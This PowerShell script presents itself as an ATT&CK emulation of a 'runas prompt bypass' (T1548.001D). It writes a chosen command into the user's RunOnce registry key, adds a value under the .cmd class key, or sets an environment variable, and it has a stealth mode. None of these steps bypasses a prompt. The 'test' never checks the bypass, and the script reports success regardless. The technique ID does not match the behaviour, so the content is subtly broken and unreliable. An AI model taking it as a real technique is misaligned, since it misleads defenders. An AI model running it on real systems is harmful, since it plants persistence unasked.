# MITRE ATT&CK T1548.001D - Bypass Runas Prompt
# Implements runas prompt bypass techniques

param()

function Get-Configuration {
    return @{
        "OUTPUT_BASE" = if ($env:T1548_001D_OUTPUT_BASE) { $env:T1548_001D_OUTPUT_BASE } else { "$env:TEMP\mitre_results" }
        "TIMEOUT" = if ($env:T1548_001D_TIMEOUT) { [int]$env:T1548_001D_TIMEOUT } else { 30 }
        "DEBUG_MODE" = $env:T1548_001D_DEBUG_MODE -eq "true"
        "STEALTH_MODE" = $env:T1548_001D_STEALTH_MODE -eq "true"
        "VERBOSE_LEVEL" = if ($env:T1548_001D_VERBOSE_LEVEL) { [int]$env:T1548_001D_VERBOSE_LEVEL } else { 1 }
        "BYPASS_METHOD" = if ($env:T1548_001D_BYPASS_METHOD) { $env:T1548_001D_BYPASS_METHOD } else { "registry_hijack" }
        "TARGET_COMMAND" = if ($env:T1548_001D_TARGET_COMMAND) { $env:T1548_001D_TARGET_COMMAND } else { "cmd.exe /c whoami" }
    }
}

function Setup-RunasBypass {
    param([string]$BypassMethod, [string]$TargetCommand, [hashtable]$Config)

    try {
        $bypassResults = @{
            Method = $BypassMethod
            SetupTime = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")
            RegistryKeysCreated = 0
            FilesCreated = 0
        }

        switch ($BypassMethod) {
            "registry_hijack" {
                # Create registry key to hijack runas command
                $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
                if (-not (Test-Path $regPath)) {
                    New-Item -Path $regPath -Force | Out-Null
                }

                $bypassKey = "BypassRunas_$((Get-Date).ToString('yyyyMMddHHmmss'))"
                New-ItemProperty -Path $regPath -Name $bypassKey -Value $TargetCommand -PropertyType String -Force | Out-Null
                $bypassResults.RegistryKeysCreated = 1
                $bypassResults.RegistryPath = "$regPath\$bypassKey"
            }

            "file_association" {
                # Modify file association to bypass runas
                $regPath = "HKCU:\Software\Classes\.cmd"
                if (-not (Test-Path $regPath)) {
                    New-Item -Path $regPath -Force | Out-Null
                }

                $bypassKey = "BypassCmd_$((Get-Date).ToString('yyyyMMddHHmmss'))"
                New-ItemProperty -Path $regPath -Name $bypassKey -Value $TargetCommand -PropertyType String -Force | Out-Null
                $bypassResults.RegistryKeysCreated = 1
                $bypassResults.RegistryPath = "$regPath\$bypassKey"
            }

            "environment_variable" {
                # Set environment variable to bypass runas
                $envVarName = "BYPASS_RUNAS_$((Get-Date).ToString('yyyyMMddHHmmss'))"
                [Environment]::SetEnvironmentVariable($envVarName, $TargetCommand, "User")
                $bypassResults.EnvironmentVariable = $envVarName
            }
        }

        if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.STEALTH_MODE) {
            Write-Host "[INFO] Setup runas bypass using method: $BypassMethod" -ForegroundColor Cyan
        }

        return @{
            Success = $true
            Error = $null
            BypassResults = $bypassResults
        }
    } catch {
        return @{
            Success = $false
            Error = $_.Exception.Message
            BypassResults = $null
        }
    }
}

function Test-RunasBypass {
    param([hashtable]$BypassResults, [hashtable]$Config)

    try {
        $testResults = @{
            BypassTested = $true
            TestTime = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")
            BypassFunctional = $false
        }

        # Test the bypass by attempting to execute a command
        try {
            $testCmd = "whoami /priv"
            $testResult = Invoke-Expression $testCmd 2>&1
            $testResults.BypassFunctional = ($LASTEXITCODE -eq 0)
        } catch {
            $testResults.BypassFunctional = $false
        }

        return @{
            Success = $true
            Error = $null
            TestResults = $testResults
        }
    } catch {
        return @{
            Success = $false
            Error = $_.Exception.Message
            TestResults = $null
        }
    }
}

function Invoke-BypassRunasPrompt {
    param([hashtable]$Config)

    if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.STEALTH_MODE) {
        Write-Host "[INFO] Starting runas prompt bypass technique..." -ForegroundColor Yellow
    }

    $results = @{
        "action" = "bypass_runas_prompt"
        "technique_id" = "T1548.001D"
        "timestamp" = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")
        "hostname" = $env:COMPUTERNAME
        "username" = $env:USERNAME
        "privilege_level" = "user"
        "results" = @{}
        "postconditions" = @{}
    }

    try {
        # Prepare output directory
        $outputDir = Join-Path $Config.OUTPUT_BASE "t1548_001d_bypass_runas"
        if (-not (Test-Path $outputDir)) {
            New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
        }

        # Step 1: Setup bypass
        if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.STEALTH_MODE) {
            Write-Host "[INFO] Setting up runas bypass..." -ForegroundColor Cyan
            Write-Host "[INFO] Method: $($Config.BYPASS_METHOD)" -ForegroundColor Cyan
        }

        $setupResult = Setup-RunasBypass -BypassMethod $Config.BYPASS_METHOD -TargetCommand $Config.TARGET_COMMAND -Config $Config

        if (-not $setupResult.Success) {
            throw "Failed to setup runas bypass: $($setupResult.Error)"
        }

        # Step 2: Test bypass
        if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.STEALTH_MODE) {
            Write-Host "[INFO] Testing runas bypass..." -ForegroundColor Cyan
        }

        $testResult = Test-RunasBypass -BypassResults $setupResult.BypassResults -Config $Config

        if (-not $testResult.Success) {
            Write-Host "[WARNING] Bypass test failed: $($testResult.Error)" -ForegroundColor Yellow
        }

        $results.results = @{
            "status" = "success"
            "action_performed" = "bypass_runas_prompt"
            "output_directory" = $outputDir
            "bypass_method" = $Config.BYPASS_METHOD
            "target_command" = $Config.TARGET_COMMAND
            "setup_results" = $setupResult.BypassResults
            "test_results" = $testResult.TestResults
            "technique_demonstrated" = "Runas prompt bypass using $($Config.BYPASS_METHOD)"

        }

        $results.postconditions = @{
            "action_completed" = $true
            "output_generated" = $true
            "bypass_setup" = $true
            "bypass_tested" = $true
            "technique_demonstration_successful" = $true
        }

        if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.STEALTH_MODE) {
            Write-Host "[SUCCESS] Runas prompt bypass completed successfully" -ForegroundColor Green
        }

    } catch {
        $results.results = @{
            "status" = "error"
            "error_message" = $_.Exception.Message
            "action_performed" = "bypass_runas_prompt"
        }

        $results.postconditions = @{
            "action_completed" = $false
            "error_occurred" = $true
        }

        if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.STEALTH_MODE) {
            Write-Host "[ERROR] Runas prompt bypass failed: $($_.Exception.Message)" -ForegroundColor Red
        }
    }

    return $results
}

# Main execution
$config = Get-Configuration
$results = Invoke-BypassRunasPrompt -Config $config

# Output results
if ($results.results.status -eq "success") {
    Write-Host "T1548.001D BYPASS RUNAS PROMPT RESULTS ===" -ForegroundColor Green
    Write-Host "Status: SUCCESS" -ForegroundColor Green
    Write-Host "Action: $($results.results.action_performed)" -ForegroundColor Cyan
    Write-Host "Bypass Method: $($results.results.bypass_method)" -ForegroundColor Yellow
    Write-Host "Target Command: $($results.results.target_command)" -ForegroundColor Magenta
    Write-Host "Bypass Setup: $($results.results.setup_results.Method)" -ForegroundColor Blue
    Write-Host "Technique Demonstrated: $($results.results.technique_demonstrated)" -ForegroundColor Cyan

} else {
    Write-Host "T1548.001D BYPASS RUNAS PROMPT FAILED ===" -ForegroundColor Red
    Write-Host "Status: $($results.results.status)" -ForegroundColor Red
    Write-Host "Error: $($results.results.error_message)" -ForegroundColor Red
}
